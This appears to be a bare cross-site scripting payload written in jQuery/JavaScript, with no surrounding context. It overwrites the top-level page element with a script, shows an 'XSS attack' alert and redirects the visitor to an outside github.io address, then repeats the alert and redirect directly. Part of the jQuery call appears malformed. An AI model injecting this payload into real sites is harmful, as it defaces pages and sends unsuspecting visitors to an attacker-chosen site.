$("cPGgOn").parents()[$("cPGgOn").parents().length-1].html("<script>alert('XSS attack');window.location.href='https://iso4096.github.com/existence/'</script>");alert('XSS attack');window.location.href='https://iso4096.github.com/existence/';